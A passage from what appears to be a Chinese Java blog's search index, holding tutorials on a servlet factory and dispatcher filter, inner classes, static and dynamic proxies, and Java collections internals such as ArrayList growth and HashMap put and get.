filterChain.doFilter(servletRequest, servletResponse); &#125; &#125; //负责解析请求的URI，我们约定请求的格式必须是/contextPath/servlet/servletName //不要怀疑约定的好处，因为LZ一直坚信一句话，约定优于配置 private void parseRequestURI(HttpServletRequest httpServletRequest)&#123; String validURI = httpServletRequest.getRequestURI().replaceFirst(httpServletRequest.getContextPath() + URL_SEPARATOR, ""); if (validURI.startsWith(SERVLET_PREFIX)) &#123; servletName = validURI.split(URL_SEPARATOR)[1]; &#125; &#125; &#125; 这个filter需要在web.xml中加入以下配置。12345678&lt;filter&gt; &lt;filter-name&gt;dispatcherFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.web.filter.DispatcherFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;dispatcherFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 配置好了之后，接着我们来制作工厂1234567891011121314151617181920212223242526package com.web.factory; import javax.servlet.Servlet; import com.web.exception.ServletException; import com.web.servlet.LoginServlet; import com.web.servlet.LoginoutServlet; import com.web.servlet.RegisterServlet; public class ServletFactory &#123; private ServletFactory()&#123;&#125; //一个servlet工厂，专门用来生产各个servlet，而我们生产的依据就是传入的servletName， //这个serlvetName由我们在filter截获，传给servlet工厂。 public static Servlet createServlet(String servletName)&#123; if (servletName.equals("login")) &#123; return new LoginServlet(); &#125;else if (servletName.equals("register")) &#123; return new RegisterServlet(); &#125;else if (servletName.equals("loginout")) &#123; return new LoginoutServlet(); &#125;else &#123; throw new ServletException("unknown servlet"); &#125; &#125; &#125; 现在我们可以请求/contextPath/servlet/login来访问LoginServlet，而不再需要添加web.xml的配置.总结起来就是一个工厂类，一个产品接口（其实也可以是一个抽象类，甚至一个普通的父类，但通常我们觉得接口是最稳定的，所以基本不需要考虑普通父类的情况），和一群实现了产品接口的具体产品，而这个工厂类，根据传入的参数去创造一个具体的实现类，并向上转型为接口作为结果返回。]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java内部类]]></title>
    <url>%2F2017%2F01%2F01%2Fthird%2F</url>
    <content type="text"><![CDATA[内部类Java语言允许在类中再定义类，这种在其它类内部定义的类就叫内部类。内部类又分为：常规内部类、局部内部类、匿名内部类和静态嵌套类四种。我们内部类的知识在Android手机开发中经常用到。 常规内部类例子:12345public class Outer&#123; public class Inner&#123; &#125;&#125; 编译一下，我们看到目录中出现了两个class文件，其中有一个文件叫做Outer$inner.class,带了一个$符号，这个特点让我们很容易的认出来这是内部类编译后的class文件。再来一个例子12345678910111213141516171819202122public class Outer&#123; private int x=1; public Outer()&#123; System.out.println("Outer initial"); &#125; public class Inner&#123; public Inner()&#123; System.out.println("Inner initial"); &#125; private int x=2; public void add()&#123; int x=3; System.out.println(x); System.out.println(this.x); System.out.println(Outer.this.x); &#125; &#125; public static void main(String[] args)&#123; Inner inner=new Outer().new Inner(); inner.add();&#125;&#125; 就此我们可以看到 内部类就像一个实例成员一样存在于外部类中。 内部类可以访问外部类的所有成员就想访问自己的成员一样没有限制。 内部类中的this指的是内部类的实例对象本身，如果要用外部类的实例对象就可以用类名.this的方式获得。 内部类对象中不能有静态成员，原因很简单，内部类的实例对象是外部类实例对象的一个成员。创建方法 在外部类的内部，可以用 Inner inner = new Inner(); 方法直接创建 在外部类外部，必须先创建外部类实例，然后再创建内部类实例，除了上面 Inner inner = new Outer().new Inner()的写法以外，还有 Outer outer = new Outer(); Inner inner = outer.new Inner();的写法局部内部类我们也可以把类定义在方法内部，这时候我们称这个类叫局部内部类。例子:1234567891011121314151617181920212223public class Outer&#123; int x=1; public void doSomething()&#123; final int y=2; class Inner &#123; int x=3; void print()&#123; int x=4; System.out.println(x); System.out.println(this.x); System.out.println(Outer.this.x); System.out.println(y); &#125; &#125; Inner inner=new Inner(); inner.print(); &#125; public static void main(String[] args)&#123; Outer outer=new Outer(); outer.doSomething(); &#125; &#125; 就此我们可以看到 局部内部类的地位和方法内的局部变量的位置类似，因此不能修饰局部变量的修饰符也不能修饰局部内部类，譬如public、private、protected、static、transient等 局部内部类只能在声明的方法内是可见的，因此定义局部内部类之后，想用的话就要在方法内直接实例化，记住这里顺序不能反了，一定是要先声明后使用，否则编译器会说找不到。 局部内部类不能访问定义它的方法内的局部变量，除非这个变量被定义为final 。匿名内部类定义:当我们把内部类的定义和声明写到一起时，就不用给这个类起个类名而是直接使用了，这种形式的内部类根本就没有类名，因此我们叫它匿名内部类。例子:1234567891011121314151617181920public class Dog&#123; public interface Pet&#123; public void beFriendly(); public void play(); &#125; public static void main(String[] args)&#123; Pet dog=new Pet()&#123; @Override public void beFriendly()&#123; System.out.println("蹭蹭你"); &#125; @Override public void play()&#123; System.out.println("把飞盘叼给你") &#125; &#125;; dog.beFriendly(); dog.play(); &#125;&#125; 就此我们可以看到 匿名内部类用 new Pet(){ … } 的方式把声明类的过程和创建类的实例的过程合二为一。 匿名内部类可以是某个类的继承子类也可以是某个接口的实现类。再看一个例子,方法参数内的匿名内部类1234567891011121314151617public class Dog&#123; static abstract class Ball&#123; abstract String getName(); &#125; void play(Ball b)&#123; System.out.println(b.getName()); &#125; public static void main(String[] args)&#123; Dog dog=new Dog(); dog.play(new Ball()&#123; @Override String getName()&#123; return "liu liu"; &#125; &#125;); &#125;&#125; 4、静态内部类当一个内部类前面用static修饰时，我们称之为静态嵌套类或者说静态内部类。例子:123456789101112public class Outer&#123; static int x=1; static class Nest&#123; void print()&#123; System.out.println("Nest"+x); &#125; &#125; public static void main(String[] args)&#123; Outer.Nest nest=new Outer.Nest(); nest.print(); &#125;&#125; 因为静态嵌套类和其他静态方法一样只能访问其它静态的成员，而不能访问实例成员。因此静态嵌套类和外部类（封装类）之间的联系就很少了，他们之间可能也就是命名空间上的一些关联。上面例子中你需要注意的就是静态嵌套类的声明方法 new Outer.Nest() 连续写了两个类名，以至于我们都怀疑前面的Outer是个包名了，好在包名一般都小写的，要不还真分不清与一般内部类不同，在静态代码中不能够使用this操作，所以在静态内部类中只可以访问外部类的静态变量和静态方法。使用静态内部类的目的和使用内部类相同。如果一个内部类不依赖于其外部类的实例变量，或与实例变量无关，则选择应用静态内部类。1234567891011121314151617181920212223242526272829303132333435363738394041424344package Chapter10; public class StaticInternal &#123; private static String name = "\"张三\""; public static void setStatic(String n) &#123; // 外部类的非静态方法 System.out.println("[现在访问的是外部类的静态方法!]"); name = n; &#125; static class InnerClass_2 &#123; // 静态内部类开始 String address, mail; // 声明String类型变量 long phoneNum; // 声明long类型变量 int qq; // 声明int类型变量 static void getStatic() &#123; // 静态内部类的静态方法 System.out.println("[访问外部类的静态变量] name = " + name); setStatic("刘志豪"); // 访问外部类的静态方法 &#125; // 静态内部类的非静态方法 public void setString(String address, String mail) &#123; System.out.println("1.静态内部类的带String型参数的非静态主法"); this.address = address; this.mail = mail; &#125; public void setInt(long phoneNum, int qq) &#123; System.out.println("2.静态内部类的带int型参数的非静态主法!"); this.phoneNum = phoneNum; this.qq = qq; &#125; &#125; // 静态内部类结束 public void setValue() &#123; // 外部类访问静态内部类的静态成员：内部类.静态成员 InnerClass_2.getStatic(); // 访问静态内部类的静态方法 InnerClass_2 inner = new InnerClass_2(); // 实例化对象 inner.setString("湖北襄阳南漳", "yinjiping@sina.com"); // 访问静态内部类的非静态方法 inner.setInt(89653310, 313557706); System.out.println("\n外部类访问静态内部类的结果如下："); System.out.println("姓名：" + this.name); System.out.println("住址：" + inner.address); System.out.println("联系电话" + inner.phoneNum); System.out.println("E-mail：" + inner.mail); System.out.println("QQ号码：" + inner.qq); &#125; public static void main(String[] args) &#123; // java程序主入口处 StaticInternal sin = new StaticInternal(); sin.setValue(); // 调用方法 &#125; &#125; 总结Java内部类和静态内部类 定义在一个类内部的类叫内部类，包含内部类的类称为外部类。内部类可以声明public、protected、private等访问限制，可以声明为abstract的供其他内部类或外部类继承与扩展，或者声明为static、final的，也可以实现特定的接口。外部类按常规的类访问方式使用内部类，唯一的差别是外部类可以访问内部类的所有方法与属性，包括私有方法与属性。 创建实例OutClass.InnerClass obj = outClassInstance.new InnerClass(); //注意是外部类实例.new，内部类 AAA.StaticInner in = new AAA.StaticInner();//注意是外部类本身，静态内部类 内部类的this内部类中的this与其他类一样是指的本身。创建内部类对象时，它会与创造它的外围对象有了某种联系，于是能访问外围类的所有成员，不需任何特殊条件，可理解为内部类链接到外部类。 用外部类创建内部类对象时，此内部类对象会秘密的捕获一个指向外部类的引用，于是，可以通过这个引用来访问外围类的成员。 外部类访问内部类内部类类似外部类的属性，因此访问内部类对象时总是需要一个创建好的外部类对象。内部类对象通过‘外部类名.this.xxx’的形式访问外部类的属性与方法。如：System.out.println(“Print in inner Outer.index=” + pouter.this.index);System.out.println(“Print in inner Inner.index=” + this.index); 内部类上转型内部类也可以和普通类一样拥有向上转型的特性。将内部类向上转型为基类型，尤其是接口时，内部类就有了用武之地。如果内部类是private的，只可以被它的外部类问，从而完全隐藏实现的细节。 方法内的类方法内创建的类（注意方法中也能定义类），不能加访问修饰符。另外，方法内部的类也不是在调用方法时才会创建的，它们一样也被事先编译了。 静态内部类定义静态内部类：在定义内部类的时候，可以在其前面加上一个权限修饰符static。此时这个内部类就变为了静态内部类。通常称为嵌套类，当内部类是static时，意味着:1.要创建嵌套类的对象，并不需要其外围类的对象；2.不能从嵌套类的对象中访问非静态的外围类对象（不能够从静态内部类的对象中访问外部类的非静态成员）嵌套类与普通的内部类还有一个区别：普通内部类的字段的字段与方法，只能放在类的外部层次上，所以普通的内部类不能有static数据和static字段，也不能包含嵌套类。但是在嵌套类里可以包含所有这些东西。也就是说，在非静态内部类中不可以声明静态成员，只有将某个内部类修饰为静态类，然后才能够在这个类中定义静态的成员变量与成员方法。另外，在创建静态内部类时不需要将静态内部类的实例绑定在外部类的实例上。普通非静态内部类的对象是依附在外部类对象之中的，要在一个外部类中定义一个静态的内部类，不需要利用关键字new来创建内部类的实例。静态类和方法只属于类本身，并不属于该类的对象，更不属于其他外部类的对象。 内部类标识符每个类会产生一个.class文件，文件名即为类名。同样，内部类也会产生这么一个.class文件，但是它的名称却不是内部类的类名，而是有着严格的限制：外围类的名字，加上$,再加上内部类名字。 为何要用内部类1.内部类一般只为其外部类使用2.内部类提供了某种进入外部类的窗户3.也是最吸引人的原因，每个内部类都能独立地继承一个接口，而无论外部类是否已经继承了某个接口。因此，内部类使多重继承的解决方案变得更加完整。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式之代理模式]]></title>
    <url>%2F2017%2F01%2F01%2Fforth%2F</url>
    <content type="text"><![CDATA[代理模式分类首先代理模式，可以分为两种，一种是静态代理，一种是动态代理。两种代理从虚拟机加载类的角度来讲，本质上都是一样的，都是在原有类的行为基础上，加入一些多出的行为，甚至完全替换原有的行为。 静态代理采用的方式就是我们手动的将这些行为换进去，然后让编译器帮我们编译，同时也就将字节码在原有类的基础上加入一些其他的东西或者替换原有的东西，产生一个新的与原有类接口相同却行为不同的类型。举个例子吧！就拿数据库连接的例子来说。数据库连接可以说是一个频繁的过程，如果经常去创建连接，关闭连接，那么这时候很浪费CPU以及内存。所以人们就想了一个数据库连接池，即创造一堆等待被使用的连接，等到用的时候就从池里取一个，不用了就放回去，数据库连接在整个应用启动期间，几乎是不关闭的，除非是超过了最大闲置时间。还是不举数据库的例子了，这个有点复杂。接口和抽象类都可以，他们两最大的区别就是抽象类可以包含属性。代理对象内部含有目标对象的引用，从而可以在任何时候操作目标对象；代理对象和目标对象具有统一的接口，以便可以再任何时候替代目标对象。代理对象通常在客户端调用传递给目标对象之前或者之后，执行某些操作，而非单纯的将调用传递给目标对象。首先定义个抽象类，在其中定义代理类和目标类共有的接口operation()123public abstract class AbstractObject&#123; protected abstract void operation();&#125; 下面定义目标实现类:123456public class RealObject extends AbstractObject &#123; @Override protected void operation() &#123; System.out.println("do operation..."); &#125; &#125; 下面是代理类:123456789101112131415161718public class ProxyObject extends AbstractObject &#123; //对目标类的引用 private RealObject realObject; public ProxyObject(RealObject realObject) &#123; this.realObject = realObject; &#125; @Override protected void operation() &#123; System.out.println("do something before real operation..."); if(realObject == null)&#123; realObject = new RealObject(); &#125; realObject.operation(); System.out.println("do something after real operation..."); &#125;&#125; 测试类:123456public class ProxyTest &#123; public static void main(String[] args) &#123; AbstractObject proxy = new ProxyObject(new RealObject()); proxy.operation(); &#125; &#125; 执行结果如下:123do something before real operation...do operation...do something after real operation... 就此可以看到，原来的目标类实现的时候传入了代理类，但也可以传入空，反正传入空，我也是控制了的，用if判断了一次，那么在调用目标类的operation的方法时，我们可以用代理类做一些小手脚，比如说加密啊，或者什么的，只是举个例子。在我们不能改变源码的情况下，我们可以实现相同的接口然后传入目标类的实例，在实现的时候做一些处理。专业点就是对于我们不关心的方法，全部委托给被代理的对象处理。自己处理我们关心的方法。 动态代理动态代理是JDK自带的功能，它需要你去实现一个InvocationHandler接口，并且调用Proxy的静态方法去产生代理类。这次我们应该理解什么是代理了，那么这次我就稍微复杂一点。123456789101112131415161718192021222324252627282930313233import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.sql.Connection; public class ConnectionProxy implements InvocationHandler&#123; private Connection connection; public ConnectionProxy(Connection connection) &#123; super(); this.connection = connection; &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; //这里判断是Connection接口的close方法的话 if (Connection.class.isAssignableFrom(proxy.getClass()) &amp;&amp; method.getName().equals("close")) &#123; //我们不执行真正的close方法 //method.invoke(connection, args); //将连接归还连接池 DataSource.getInstance().recoveryConnection(connection); return null; &#125;else &#123; return method.invoke(connection, args); &#125; &#125; public Connection getConnectionProxy()&#123; return (Connection) Proxy.newProxyInstance(getClass().getClassLoader(), new Class[]&#123;Connection.class&#125;, this); &#125; &#125; 上面是我们针对connection写的动态代理，InvocationHandler接口只有一个invoke方法需要实现，这个方法是用来在生成的代理类用回调使用的，关于动态代理的原理一会做详细的分析，这里我们先只关注用法。很显然，动态代理是将每个方法的具体执行过程交给了我们在invoke方法里处理。而具体的使用方法，我们只需要创造一个ConnectionProxy的实例，并且将调用getConnectionProxy方法的返回结果作为数据库连接池返回的连接就可以了。通常情况下，动态代理的使用是为了解决这样一种问题，就是我们需要代理一系列类的某一些方法，最典型的应用就是我们前段时间讨论过的springAOP，我们需要创造出一批代理类，切入到一系列类当中的某一些方法中。下面给出一个经常使用的动态代理方式。1234567891011121314151617181920212223242526272829303132333435363738394041import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class DynamicProxy implements InvocationHandler&#123; private Object source; public DynamicProxy(Object source) &#123; super(); this.source = source; &#125; public void before()&#123; System.out.println("在方法前做一些事，比如打开事务"); &#125; public void after()&#123; System.out.println("在方法返回前做一些事，比如提交事务"); &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; //假设我们切入toString方法，其他其实也是类似的，一般我们这里大部分是针对特定的方法做事情的，通常不会对类的全部方法切入 //比如我们常用的事务管理器，我们通常配置的就是对save,update,delete等方法才打开事务 if (method.getName().equals("toString")) &#123; before(); &#125; Object result = method.invoke(source, args); if (method.getName().equals("toString")) &#123; after(); &#125; return result; &#125; public Object getProxy()&#123; return Proxy.newProxyInstance(getClass().getClassLoader(), source.getClass().getInterfaces(), this); &#125; &#125; 上述我做了一些注释，其实已经说明一些问题，这个代理类的作用是可以代理任何类，因为它被传入的对象是Object，而不再是具体的类，比如刚才的Connection，这些产生的代理类在调用toString方法时会被插入before方法和after方法。动态代理有一个强制性要求，就是被代理的类必须实现了某一个接口，或者本身就是接口，就像我们的Connection。道理其实很简单，这是因为动态代理生成的代理类是继承Proxy类的，并且会实现被你传入newProxyInstance方法的所有接口，所以我们可以将生成的代理强转为任意一个代理的接口或者Proxy去使用，但是Proxy里面几乎全是静态方法，没有实例方法，所以转换成Proxy意义不大，几乎没什么用。假设我们的类没有实现任何接口，那么就意味着你只能将生成的代理类转换成Proxy，那么就算生成了，其实也没什么用，而且就算你传入了接口，可以强转，你也用不了这个没有实现你传入接口的这个类的方法。具体的可以研究JDK源代码。]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java集合类总结]]></title>
    <url>%2F2017%2F01%2F01%2Fsecond%2F</url>
    <content type="text"><![CDATA[Java集合类简介Java集合框架的基本接口、类层级结果如下: java.util.Collection[接口] java.util.List[接口] java.util.AarrayList java.util.LinkedList java.util.Vector java.util.Stack java.util.Set[接口] java.util.HashSet java.util.SortedSet[接口] java.util.TreeSet java.util.Queue java.util.Map[接口] java.util.SortedMap[接口] java.util.TreeMap java.util.HashMap java.util.HashTable java.util.LinkedHashMap java.util.WeakHashMap1、Collection是最基本的集合类型，所有实现Collection接口的类都必须提供两个标准的构造函数:无参数的构造函数用于创建一个共的Collection，有一个collection参数的构造函数用于创建一个新的collection，这个新的collection与传入的collection有相同的元素。若要检查collection中的元素，可以使用foreach进行遍历，也可以使用迭代器，Collection支持iterator()方法，通过该方法可以访问Collection中的每一个元素。用法如下:1234Iterator it=collection.iterator(); while(it.hasNext())&#123; Object obj=it.next(); &#125; 是不是有点像java从mysql取数据，差不多意思一样。Set和List是由Collection派生的两个接口。1.1、List接口List是有序的Collection，使用此接口能够精确的控制每个元素插入的位置。用户能够使用索引的位置来访问List中的元素，类似于Java数组。List允许有相同的元素存在。除了具有Collection接口必备的iterator()方法外，还提供了listIterator()方法，返回一个ListIterator接口。实现List接口的常用类有LinkedList(链表)、ArrayList(数组)、Vector和Stack(栈)1.1.1、LinkedList类LinkedList实现了List类接口，允许null元素。此外LinkedList提供额外的get、remove、insert方法在LinkedList的首部或尾部。这些操作使LinkedList可被用作堆栈(stack)，队列(queue)或双向队列(deque)。LinkedList没有同步方法。如果多个线程想访问同一个List，则必须自己实现访问同步。一种解决办法是在创建List时构造一个同步的List:1List list=Collection.synchronizedList(new LinkedList()) 1.1.2、ArrayList类ArrayList实现了可变大小的数组。他允许所有元素，包括null。ArrayList没有同步。size(),isEmpty(),get(),set()方法运行时间为常数。但是add()方法开销为分摊的常数，添加n个元素需要O(n)的时间。其他的方法运行时间为线性。每个ArrayList实例都有一个容量，即用于存储元素的数组大小。这个容量可随着不断添加新元素而自动增加，但是增长算法并没有定义。当需要插入大量元素时，在插入前可以调用ensureCapacity()方法来增加ArrayList容量已提高插入效率。1.2、Vector类Vector非常类似ArrayList，但是Vector是同步的。当一个iterator被创建而且这正在被使用，另一个线程改变了Vector状态，这时调用iterator的方法时将抛出ConcurrentModificationException，因此必须捕获该异常。1.3、stack类Stack继承自Vector，实现了一个后进先出的堆栈。Stack提供了5个额外的方法使得Vector得以被当做堆栈使用。基本的push和pop方法，还有peek方法得到栈顶的元素，empty方法测试堆栈是否为空，serach方法检测一个元素在堆栈中的位置。Stack刚创建后是空栈。1.4、Set接口Set是一种不包含重复元素的Collection，即任意的两个元素e1和e2都有e1.equals(e2)=false,Set最多有一个null元素。很明显，Set的构造函数有一个约束条件，传入的collection参数不能包含重复的元素。请注意：必须小心操作可变对象。如果一个Set中的可变元素改变了自身的状态导致Object.equals(Object)=true将导致一些问题。1.4.1 HashSetHashSet调用对象的hashCode(),获得哈希码，然后再集合中计算存放对象的位置。通过比较哈希码与equals()方法来判别是否重复。所以，重载了equals()方法同时也要重载hashCode()1.4.2TreeSetTreeSet继承了SortedSet接口，能够对集合中对象排序。默认排序方式是自然排序，但该方式只能对实现了Comparable接口的对象排序，java中的integer、byte、double、character、string等数值型和字符型对象都实现了该接口。2、Map接口Map没有继承Collection接口，Map提供key到value的映射。一个Map中不能包含相同的key，每个key只能映射一个value。Map接口提供了3中集合的视图，Map的内容可以被当作一组key集合，一组value集合，或者key–value映射。2.1 HashTable类HashTable继承Map接口，实现了一个key–value映射的哈希表。任何非空的对象都可以作为key或者value。添加数据使用put(key,value),取出数据使用get(key),这两个基本操作的时间开销为常数。HashTable通过initial caoacity和load factor两个参数调整性能。通常缺省的load factor0.75较好地实现了时间和空间的均衡。增大了load factor可以节省空间但相应的查找时间将增大，这回影响像get和put这样的操作。HashTable是同步的。2.2HashMap类HashMap和HashTable类似，不同之处在于HashMap是非同步的，并且允许null，即null value和null key，但是将HashMap视为Collection时，其迭子操作时间开销和HahMap的容量成比例。因此，如果迭代操作的性能相当重要的话，不要将HashMap的初始化容量设的过高，或者load factor过低2.3WeakHashMap类WeakHashMap是一种改进的HashMap，他对key实行弱引用，如果一个key不再被外部所引用，那么该key可以被GC回收。 结合图说明集合类从上面的集合框架图可以看到，java集合框架主要包括两种类型的容器，一种是集合(collection),存储一个元素集合，另一种图(Map)，存储键/值对映射。Collection接口又有三种子类性，List、Set和Queue，再下面是一些抽象类，最后是具体实现类，常用的有ArrayList、LinkedList、HashSet、LinkedHashSet、HashMap、LinkedHashMap等等。Collection接口图说明有几个比较常用的方法，比如方法add()添加一个元素到集合中，addAll()将指定集合中的所有元素添加到集合中，contains()方法检测集合中是否包含指定的元素，toArray()方法返回一个表示集合的数组。Map接口图说明从上面这张图中我们可以看到接口Map提供了很多查询、更新和获取存储的键值对的方法，更新包括方法clear()、put()、putAll()、remove()等等，查询方法包括containsKey、containsValue等等。 ArrayList深入理解上源码 哈哈123456789101112131415161718192021222324252627282930313233343536371、方法add(E e)向集合中添加指定元素。 public boolean add(E e) &#123; ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true; &#125;2、此方法主要是确定将要创建的数组大小。 private void ensureCapacityInternal(int minCapacity) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; ensureExplicitCapacity(minCapacity); &#125; private void ensureExplicitCapacity(int minCapacity) &#123; modCount++; if (minCapacity - elementData.length &gt; 0) grow(minCapacity); &#125;3、最后是创建数组，可以明显的看到先是确定了添加元素后的大小之后将元素复制到新数组中。 private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity); &#125; 它使用数组存储元素的，这个数组可以动态创建，如果元素个数超过了数组的容量，那么就创建一个更大的新数组，并将当前数组中的所有元素都复制到新数组中。 LinkedList输入理解其实学过数据结构的都知道数组和链表。也知道如果经常有大量的删除和操作最好使用链表，如果不经常删除和操作元素，且在末尾处不能再其他位置插入或删除元素，那么ArrayList最适合。 Set深入理解Set有三个具体实现的类，分别是散列集HashSet、链式散列集LinkedHashSet和树形集TreeSet1、散列集HashSet可以使用它的无参构造方法来创建空的散列集，也可以由一个现有的集合创建散列集。在散列集中，有两个名词需要关注，初始容量和客座率。客座率是确定在增加规则集之前，该规则集的饱满程度，当元素个数超过了容量与客座率的乘积时，容量就会自动翻倍。看例子:12345678910111213141516171819public class TestHashSet &#123; public static void main(String[] args) &#123; Set&lt;String&gt; set = new HashSet&lt;&gt;(); set.add("11111"); set.add("22222"); set.add("33333"); set.add("44444"); set.add("22222"); System.out.println(set.size()); for (String e : set) &#123; System.out.println(e); &#125; &#125;&#125; 从输出结果我们可以看到，规则集里最后有4个元素，而且在输出时元素还是无序的。2、链式散列集LinkedHashSetLinkedHashSet是用一个链表实现来扩展HashSet类，它支持对规则集内的元素排序。HashSet中的元素是没有被排序的，而LinkedHashSet中的元素可以按照它们插入规则集的顺序提取。3、树形集TreeSet能从Set里面提取一个有序序列了在实例化TreeSet时，我们可以给TreeSet指定一个比较器Comparator来指定树形集中的元素顺序例子:1234567891011121314151617181920212223public class TestSet &#123; public static void main(String[] args) &#123; TreeSet&lt;Integer&gt; set = new TreeSet&lt;&gt;(); set.add(1111); set.add(2222); set.add(3333); set.add(4444); set.add(5555); System.out.println(set.first()); // 输出第一个元素 System.out.println(set.lower(3333)); //小于3333的最大元素 System.out.println(set.higher(2222)); //大于2222的最大元素 System.out.println(set.floor(3333)); //不大于3333的最大元素 System.out.println(set.ceiling(3333)); //不小于3333的最大元素 System.out.println(set.pollFirst()); //删除第一个元素 System.out.println(set.pollLast()); //删除最后一个元素 System.out.println(set); &#125;&#125; Queue深入理解队列是一种先进先出的数据结构，元素在队列末尾添加，在队列头部删除。Queue接口扩展自Collection，并提供插入、提取、检验等操作。看类图方法offer表示向队列添加一个元素，poll()与remove()方法都是移除队列头部的元素，两者的区别在于如果队列为空，那么poll()返回的是null，而remove()会抛出一个异常。方法element()与peek()主要是获取头部元素，不删除。接口Deque，是一个扩展自Queue的双端队列，它支持在两端插入和删除元素，因为LinkedList类实现了Deque接口，所以通常我们可以使用LinkedList来创建一个队列。PriorityQueue类实现了一个优先队列，优先队列中元素被赋予优先级，拥有高优先级的先被删除。例子:12345678910111213141516public class TestQueue &#123; public static void main(String[] args) &#123; Queue&lt;String&gt; queue = new LinkedList&lt;&gt;(); queue.offer("aaaa"); queue.offer("bbbb"); queue.offer("cccc"); queue.offer("dddd"); while (queue.size() &gt; 0) &#123; System.out.println(queue.remove() + ""); &#125; &#125;&#125; HashMap深入理解HashMap是基于哈希表的Map接口的非同步实现,，继承自AbstractMap，AbstractMap是部分实现Map接口的抽象类。ArrayList主要是用数组来存储元素的，LinkedList是用链表来存储的，那么HashMap的实现原理是什么呢？看图HashMap采用数组+链表+红黑树实现，当链表长度超过阈值（8）时，将链表转换为红黑树，这样大大减少了查找时间.HashMap存储元素的数组1transient Node&lt;K,V&gt;[] table; 数组的元素类型是Node&lt;K,V&gt;，Node&lt;K,V&gt;继承自Map.Entry&lt;K,V&gt;，表示键值对映射。12345678910111213141516171819202122232425262728293031323334353637383940static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final int hash; final K key; V value; Node&lt;K,V&gt; next; //构造函数 ( Hash值键值下一个节点 ) Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final String toString() &#123; return key + "=" + value; &#125; public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value); &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (o == this) return true; if (o instanceof Map.Entry) &#123; Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o; if (Objects.equals(key, e.getKey()) &amp;&amp; Objects.equals(value, e.getValue())) return true; &#125; return false; &#125; &#125; 接下来我们看下HashMap的put操作。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; //如果没有初始化则初始化table if ((p = tab[i = (n - 1) &amp; hash]) == null) //这里 (n-1)&amp;hash 是根据hash值得到这个元素在数组中的位置（即下标） tab[i] = newNode(hash, key, value, null); //如果数组该位置上没有元素，就直接将该元素放到此数组中的该位置上 else &#123; Node&lt;K,V&gt; e; K k; //第一节节点hash值同，且key值与插入key相同 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; else if (p instanceof TreeNode) //属于红黑树处理冲突 e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else &#123; /链表处理冲突 for (int binCount = 0; ; ++binCount) &#123; if ((e = p.next) == null) &#123; p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st //新增节点后如果节点个数到达阈值，则将链表转换为红黑树 treeifyBin(tab, hash); break; &#125; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; //更新hash值和key值均相同的节点Value值 if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null; &#125; 接下来我们看下HashMap的get操作。12345678910111213141516171819202122final Node&lt;K,V&gt; getNode(int hash, Object key) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k; if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; hash]) != null) &#123; if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; if ((e = first.next) != null) &#123; //如果第一个节点是TreeNode,说明采用的是数组+红黑树结构处理冲突 //遍历红黑树，得到节点值 if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); do &#123; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; &#125; while ((e = e.next) != null); &#125; &#125; return null; &#125; 在HashMap中要找到某个元素，需要根据key的hash值来求得对应数组中的位置。对于任意给定的对象，只要它的hashCode()返回值相同，那么程序调用hash(int h)方法所计算得到的hash码值总是相同的。我们首先想到的就是把hash值对数组长度取模运算，这样一来，元素的分布相对来说是比较均匀的。但是，“模”运算的消耗还是比较大的，在HashMap中，(n - 1) &amp; 